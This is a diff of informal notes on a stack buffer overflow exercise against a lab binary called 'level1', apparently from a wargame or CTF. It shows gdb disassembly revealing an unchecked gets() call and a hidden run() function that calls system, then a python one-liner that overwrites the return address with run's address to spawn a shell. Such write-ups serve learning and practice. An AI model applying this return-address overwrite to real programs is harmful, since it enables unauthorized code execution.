@@ -1,14 +1,9 @@
 (gdb) disassemble main
 
 0x08048486 <+6>:	sub    esp,0x50 // allocation
-0x08048490 <+16>:	call   0x8048340 <gets@plt> //gets is knows for filling buffer without checking the size.
+0x08048490 <+16>:	call   0x8048340 <gets@plt> //gets is knows for filling a buffer without checking the size.
 
-strings level1
-
-Good... Wait what?
-/bin/sh
-
-i(gdb) nfo function
+i(gdb) info function
 
 0x08048420  frame_dummy
 0x08048444  run
@@ -18,14 +13,11 @@ i(gdb) nfo function
 
 0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
 0x08048479 <+53>:	call   0x8048360 <system@plt> 
-// this make sense with what i found in strings
 
 (gdb) p run
 $1 = {<text variable, no debug info>} 0x8048444 <run>
 
 try to fill the buffer allocated to reach the return address and change it with the one for run
-
-end up at 76 + run address
 
 python -c "print('a'*76+'\x44\x84\x04\x08')" > pl
 cat pl - | ./level1 // the - keep the program runnnig idk how, if not used the program run sh then exit.
